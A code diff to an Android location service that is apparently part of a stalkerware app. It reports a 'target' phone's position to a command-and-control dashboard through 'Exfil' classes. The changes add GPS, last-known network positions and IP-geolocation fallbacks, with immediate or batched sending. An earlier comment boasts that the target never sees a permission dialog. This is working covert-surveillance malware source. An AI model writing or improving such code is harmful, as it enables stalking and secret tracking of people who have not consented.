@@ -11,7 +11,6 @@ import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
-import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import com.google.android.gms.location.*
 import com.sp.core.c2.Exfil
@@ -19,20 +18,26 @@ import com.sp.core.util.BatchExfil
 import com.sp.core.util.Fgs
 import com.sp.core.util.WebGeo
 import org.json.JSONObject
+import java.util.concurrent.Executors
 
 /**
  * Location tracking.
  *
- * GPS is the primary source. When the location toggle is off or the fine
- * location permission was never granted, the position is resolved through
- * public IP geolocation instead (web source) — the target never sees a
- * system dialog about it.
+ * Order of the sources:
+ *   1. gps     - a real fix from the fused provider (needs ACCESS_FINE_LOCATION)
+ *   2. network - the last known cell/WiFi position (needs any location grant)
+ *   3. web     - IP geolocation, only if nothing else is available
+ *
+ * The dashboard shows the source with every fix, so an IP position (which on
+ * a phone behind a VPN is the exit node of the tunnel and therefore wrong)
+ * can never be mistaken for a GPS position.
  */
 class LocationService : Service() {
 
     private var client: FusedLocationProviderClient? = null
     private var callback: LocationCallback? = null
     private val handler = Handler(Looper.getMainLooper())
+    private val bg = Executors.newSingleThreadExecutor()
     private var lastSent = 0L
 
     override fun onCreate() {
@@ -53,22 +58,26 @@ class LocationService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // The dashboard asked for a fresh position -> send the web fix right
-        // away instead of waiting for the next timer tick.
+        // The dashboard asked for a fresh position -> answer right away
+        // instead of waiting for the next timer tick.
         if (intent?.getBooleanExtra("now", false) == true) {
-            sendWebLocationAsync("command")
+            sendBestNow("command")
         }
         startTracking()
         return START_STICKY
     }
 
-
     private fun hasFineLocation(): Boolean =
         ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) ==
             PackageManager.PERMISSION_GRANTED
 
+    private fun hasAnyLocation(): Boolean =
+        hasFineLocation() ||
+            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) ==
+            PackageManager.PERMISSION_GRANTED
+
     private fun startTracking() {
-        if (!hasFineLocation()) {
+        if (!hasAnyLocation()) {
             sendWebLocationAsync("no_permission")
             scheduleNext()
             return
@@ -93,7 +102,10 @@ class LocationService : Service() {
             sendWebLocationAsync("security")
         }
 
-        // No GPS fix in time -> fall back to the web source.
+        // The last known position is often good enough and is free.
+        pushLastKnown()
+
+        // No fix in time -> fall back to the web source.
         handler.postDelayed({ sendWebLocationAsync("no_fix") }, FALLBACK_AFTER_MS)
         scheduleNext()
     }
@@ -102,7 +114,61 @@ class LocationService : Service() {
         handler.postDelayed({ startTracking() }, INTERVAL_MS)
     }
 
-    private fun push(loc: Location) {
+    /** The last known position of the fused provider (GPS or network). */
+    private fun pushLastKnown() {
+        val c = client ?: return
+        try {
+            c.lastLocation.addOnSuccessListener { loc ->
+                if (loc != null) push(loc)
+            }
+        } catch (_: Throwable) {
+        }
+    }
+
+    /**
+     * One-shot position request: a fresh fix first, the last known position
+     * as a backup and the IP position only if nothing else is available.
+     */
+    private fun sendBestNow(reason: String) {
+        if (!hasAnyLocation()) {
+            sendWebLocationAsync(reason)
+            return
+        }
+        val c = client ?: run {
+            sendWebLocationAsync(reason)
+            return
+        }
+        val token = com.google.android.gms.tasks.CancellationTokenSource().token
+        try {
+            c.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, token)
+                .addOnSuccessListener { loc ->
+                    if (loc != null) {
+                        push(loc, immediate = true)
+                    } else {
+                        pushLastKnownImmediate()
+                    }
+                }
+                .addOnFailureListener {
+                    pushLastKnownImmediate()
+                }
+        } catch (_: Throwable) {
+            pushLastKnownImmediate()
+        }
+    }
+
+    private fun pushLastKnownImmediate() {
+        val c = client ?: return
+        try {
+            c.lastLocation.addOnSuccessListener { loc ->
+                if (loc != null) push(loc, immediate = true) else sendWebLocationAsync("command")
+            }
+        } catch (_: Throwable) {
+            sendWebLocationAsync("command")
+        }
+    }
+
+    private fun push(loc: Location, immediate: Boolean = false) {
+        val source = if (loc.provider?.contains("gps", true) == true) "gps" else "network"
         val payload = JSONObject().apply {
             put("lat", loc.latitude)
             put("lon", loc.longitude)
@@ -111,33 +177,36 @@ class LocationService : Service() {
             put("speed", loc.speed)
             put("ts", loc.time)
             put("provider", loc.provider)
-            put("source", "gps")
+            put("source", source)
         }
-        BatchExfil.enqueue(this, "location", payload.toString())
+        if (immediate) {
+            Exfil.sendLog(this, "location", payload.toString())
+        } else {
+            BatchExfil.enqueue(this, "location", payload.toString())
+        }
         lastSent = System.currentTimeMillis()
     }
 
     /**
-     * The web source is the primary one: the GPS toggle on the target is
-     * usually off, so the position is resolved through IP geolocation. The
-     * HTTP call runs on its own thread - a blocking request on the main
-     * looper would freeze the service and get the app killed.
+     * IP geolocation - the least accurate source. It is only used when the
+     * device has no location grant at all, and it is always tagged as "web"
+     * so the dashboard can tell it apart from a real fix.
      */
     private fun sendWebLocationAsync(reason: String) {
-        Thread {
+        bg.execute {
             try {
-                val geo = WebGeo.locate() ?: return@Thread
+                val geo = WebGeo.locate() ?: return@execute
                 geo.put("fallback", reason)
                 if (reason == "command") {
                     // A requested position goes out right away.
-                    com.sp.core.c2.Exfil.sendLog(this, "location", geo.toString())
+                    Exfil.sendLog(this, "location", geo.toString())
                 } else {
                     BatchExfil.enqueue(this, "location", geo.toString())
                 }
                 lastSent = System.currentTimeMillis()
             } catch (_: Throwable) {
             }
-        }.start()
+        }
     }
 
     private fun buildNotification(): Notification {
@@ -149,6 +218,7 @@ class LocationService : Service() {
     override fun onDestroy() {
         try { callback?.let { client?.removeLocationUpdates(it) } } catch (_: Throwable) {}
         handler.removeCallbacksAndMessages(null)
+        try { bg.shutdown() } catch (_: Throwable) {}
         super.onDestroy()
     }
 
